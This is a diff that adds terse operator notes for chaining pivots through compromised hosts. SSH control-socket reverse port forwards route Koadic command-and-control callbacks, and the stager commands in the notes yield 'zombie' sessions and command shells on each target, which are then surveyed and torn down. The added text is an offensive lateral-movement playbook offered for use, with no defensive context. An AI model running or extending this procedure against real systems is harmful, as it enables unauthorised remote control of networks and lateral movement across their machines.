@@ -54,3 +54,57 @@ exit (kill zombies)
 zombies -k 0
 listeners -k 0
 run
+
+
+###########################################################
+
+T2 RHP: 46626 / this
+T3 RHP: 44515 / is
+T4 RHP: 49895 / not
+T5 RHP: 42150 / hard
+
+On LP, vett
+ssh -MS /tmp/T1 ... -p SSH_T1 user4@T1_IP
+On T1, vett
+On LP
+ssh -S /tmp/T1 bad -O forward -R 46626:LP_IP:46626
+koadic
+info
+set SRVHOST T1_INTERNAL_IP
+set SRVPORT TARGET_PORT
+set ENDPOINT this
+info
+run
+<give the command to EA>
+zombies
+cmdshell 0
+On T2
+<vett or survey the box>
+<disconnect>
+listener -k 0
+zombies -k <zombie>
+ssh -S /tmp/T1 bad -O cancel -R 46626:localhost:46626
+
+On LP
+ssh -S /tmp/T1 bad -O forward -R 41234:localhost:41234
+koadic
+info
+set SRVHOST 192.168.3.100
+set SRVPORT 41234
+set ENDPOINT is
+info
+run
+<give the command to EA>
+zombies
+cmdshell 0
+<vett or survey the box>
+<disconnect>
+zombies -k 0
+ssh -S /tmp/T1 bad -O cancel -R 41234:LP_IP:41234
+
+...
+
+
+
+
+
